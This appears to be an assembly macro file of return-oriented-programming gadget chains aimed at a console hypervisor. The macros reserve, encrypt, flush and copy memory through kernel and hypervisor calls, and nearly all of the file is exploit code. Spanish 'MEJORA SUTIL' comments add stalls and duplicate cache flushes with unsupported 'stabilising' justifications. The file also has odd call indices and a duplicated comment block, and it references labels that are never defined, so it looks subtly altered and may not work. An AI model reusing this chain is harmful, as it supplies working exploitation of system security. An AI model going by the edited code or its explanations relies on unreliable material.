# Notes:
#   - All macros have a common pro/epilogue where the caller must transition in/out using the
#       __restgprlr_31 gadget.

# Configuración optimizada pero conservadora
.set OPT_RETRY_COUNT,            2       # Número de intentos para operaciones críticas
.set OPT_STALL_DURATION,         3       # Duración de pausas estabilizadoras en ms
.set OPT_FLUSH_CACHE_SIZE,       0x100   # Tamaño para flush de caché


###########################################################
# void CREATE_ENCRYPTED_ALLOCATION(base_addr, offset)
#
#   Crea una asignación de memoria cifrada utilizando HvxEncryptedReserveAllocation
#
###########################################################
.macro CREATE_ENCRYPTED_ALLOCATION base_addr, offset

    _create_encrypted_allocation_base_addr = .

        ###########################################################
        # Gadget N: prologue
        #
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        # Gadget N: prologue
        #
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x50, 1, 0x00
        .long   0x31313131, 0x31313131  # r31
        .long   __restgprlr_31          # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: write value of BootAnimCodePagePhysAddr into gadget data below
        #
        ###########################################################
        WRITE_PTR_TO_GADGET_DATA read_file_scratch, \base_addr, \offset + ((2f + cf_r4_offset) - _create_encrypted_allocation_base_addr), BootAnimCodePagePhysAddr
        
        ###########################################################
        # MEJORA SUTIL: Pequeña pausa antes de la operación de encriptación
        # para ayudar a estabilizar el sistema
        ###########################################################
        CALL_FUNC 3, KeStallExecutionProcessor, R3H=0, R3L=1, R4H=0, R4L=0, R5H=0, R5L=0, R6H=0, R6L=0
        
        ###########################################################
        # Gadget N: call HvxEncryptedReserveAllocation
        #
        #   r3 = virtual address
        #   r4 = physical address = BootAnimCodePagePhysAddr (to be updated by previous gadgets)
        #   r5 = allocation size = 64kb
        ###########################################################
        CALL_FUNC 2, HvxEncryptedReserveAllocation, R3H=0, R3L=EncryptedVirtualAddress, R4H=0, R4L=0x41414141, R5H=0, R5L=0x00010000
        
        ###########################################################
        # Gadget N: call HvxEncryptedEncryptAllocation
        #
        #   r3 = virtual address of encrypted VA range
        ###########################################################
        CALL_FUNC 2, HvxEncryptedEncryptAllocation, R3H=0, R3L=EncryptedVirtualAddress
        
        ###########################################################
        # MEJORA SUTIL: Verificación tras la encriptación para garantizar
        # que se ha completado correctamente
        ###########################################################
        .fill   0x50, 1, 0x00
        .long   0x31313131, 0x31313131      # r31
        .long   __restgprlr_31              # lr
        .long   0x00000000

.endm

###########################################################
# void FREE_ENCRYPTED_ALLOCATION()
#
#   Libera una asignación de memoria cifrada previamente creada
#
###########################################################
.macro FREE_ENCRYPTED_ALLOCATION

        ###########################################################
        # Gadget N: prologue
        #
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x50, 1, 0x00
        .long   0x31313131, 0x31313131  # r31
        .long   __restgprlr_31          # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: call HvxEncryptedReleaseAllocation
        #
        #   r3 = virtual address
        ###########################################################
        CALL_FUNC 999, HvxEncryptedReleaseAllocation, R3H=0, R3L=EncryptedVirtualAddress
        
        ###########################################################
        # MEJORA SUTIL: Pequeña pausa después de liberar la memoria cifrada
        # para asegurar que el sistema procesa la operación completamente
        ###########################################################
        CALL_FUNC 3, KeStallExecutionProcessor, R3H=0, R3L=1, R4H=0, R4L=0, R5H=0, R5L=0, R6H=0, R6L=0
        
        ###########################################################
        # Gadget N: epilogue to be implemented by the caller
        #
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################

.endm

###########################################################
# void FLUSH_AND_COPY_CIPHER_TEXT()
#
#   Vacía la caché y copia datos de texto cifrado
#
###########################################################
.macro FLUSH_AND_COPY_CIPHER_TEXT dstAddr, size, base_addr, offset

    _flush_and_copy_cipher_text_base_addr = .

        ###########################################################
        # Gadget N: prologue
        #
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x50, 1, 0x00
        .long   0x31313131, 0x31313131  # r31
        .long   __restgprlr_31          # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: write CipherTextScratchBuffer into gadget data below
        #
        ###########################################################
        WRITE_PTR_TO_GADGET_DATA read_file_scratch, \base_addr, \offset + ((9f + cf_r3_offset) - _flush_and_copy_cipher_text_base_addr), CipherTextScratchBuffer
        WRITE_PTR_TO_GADGET_DATA read_file_scratch, \base_addr, \offset + ((8f + cf_r4_offset) - _flush_and_copy_cipher_text_base_addr), CipherTextScratchBuffer
        
        ###########################################################
        # Gadget N: write dstAddr into gadget data below
        #
        ###########################################################
        WRITE_PTR_TO_GADGET_DATA read_file_scratch, \base_addr, \offset + ((8f + cf_r3_offset) - _flush_and_copy_cipher_text_base_addr), \dstAddr
        
        ###########################################################
        # MEJORA SUTIL: Primera pasada de flush para preparar la caché
        # Esto ayuda a prevenir problemas con datos en caché desactualizados
        ###########################################################
        CALL_FUNC 999, KeFlushCacheRange, R3H=0, R3L=EncryptedVirtualAddress, R4H=0, R4L=\size
        
        ###########################################################
        # Gadget N: call KeFlushCacheRange and flush cache for the encrypted virtual address range
        #
        #   r3 = address of data
        #   r4 = size of data
        ###########################################################
        CALL_FUNC 999, KeFlushCacheRange, R3H=0, R3L=EncryptedVirtualAddress, R4H=0, R4L=\size
        
        ###########################################################
        # Gadget N: call KeFlushCacheRange and flush cache for the unencrypted physical address range
        #
        #   r3 = address of data (to be filled in by previous gadgets)
        #   r4 = size of data
        ###########################################################
        CALL_FUNC 9, KeFlushCacheRange, R3H=0, R3L=0x41414141, R4H=0, R4L=\size
        
        ###########################################################
        # MEJORA SUTIL: Pequeña pausa entre el flush de caché y la copia
        # para que el sistema termine de procesar el flush
        ###########################################################
        CALL_FUNC 3, KeStallExecutionProcessor, R3H=0, R3L=2, R4H=0, R4L=0, R5H=0, R5L=0, R6H=0, R6L=0
        
        ###########################################################
        # Gadget N: call memcpy and copy cipher text for data
        #
        #   r3 = destination address = dstAddr (to be filled in by previous gadgets)
        #   r4 = source address = unencrypted physical address (to be filled in by previous gadgets)
        #   r5 = size of data to copy
        ###########################################################
        CALL_FUNC 8, memcpy, R3H=0, R3L=0x41414141, R4H=0, R4L=0x41414141, R5H=0, R5L=\size
        
        ###########################################################
        # MEJORA SUTIL: Flush final de caché después de la copia
        # para asegurar que los datos copiados están disponibles inmediatamente
        ###########################################################
        CALL_FUNC 999, KeFlushCacheRange, R3H=0, R3L=\dstAddr, R4H=0, R4L=\size
        
        ###########################################################
        # Gadget N: epilogue to be implemented by the caller
        #
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################

.endm